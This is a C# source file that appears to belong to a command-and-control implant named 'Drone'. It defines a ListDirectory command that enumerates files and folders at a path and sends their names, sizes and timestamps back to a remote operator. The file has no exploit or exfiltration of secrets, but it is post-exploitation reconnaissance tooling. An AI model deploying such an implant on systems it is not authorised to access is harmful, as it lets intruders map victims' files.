using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

using ProtoBuf;

namespace Drone.Commands;

public sealed class ListDirectory : DroneCommand
{
    public override byte Command => 0x0A;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var path = task.Arguments.Any()
            ? task.Arguments[0]
            : Directory.GetCurrentDirectory();

        List<DirectoryEntry> results = new();
        
        results.AddRange(GetDirectoryInfo(path));
        results.AddRange(GetFileInfo(path));

        await Drone.SendDroneTaskOutput(new DroneTaskResponse
        {
            TaskId = task.Id,
            Status = DroneTaskStatus.Complete,
            Module = Command,
            Output = results.Serialize()
        });
    }

    private static IEnumerable<DirectoryEntry> GetDirectoryInfo(string path)
    {
        foreach (var directory in Directory.GetDirectories(path))
        {
            var info = new DirectoryInfo(directory);
            
            yield return new DirectoryEntry
            {
                Name = info.FullName,
                Length = 0,
                CreationTime = info.CreationTimeUtc,
                LastAccessTime = info.LastAccessTimeUtc,
                LastWriteTime = info.LastWriteTimeUtc
            };
        }
    }

    private static IEnumerable<DirectoryEntry> GetFileInfo(string path)
    {
        foreach (var file in Directory.GetFiles(path))
        {
            var info = new FileInfo(file);
            
            yield return new DirectoryEntry
            {
                Name = info.FullName,
                Length = info.Length,
                CreationTime = info.CreationTimeUtc,
                LastAccessTime = info.LastAccessTimeUtc,
                LastWriteTime = info.LastWriteTimeUtc
            };
        }
    }
}

[ProtoContract]
public sealed class DirectoryEntry
{
    [ProtoMember(1)]
    public string Name { get; set; }
    
    [ProtoMember(2)]
    public long Length { get; set; }
    
    [ProtoMember(3)]
    public DateTime CreationTime { get; set; }
    
    [ProtoMember(4)]
    public DateTime LastAccessTime { get; set; }
    
    [ProtoMember(5)]
    public DateTime LastWriteTime { get; set; }
}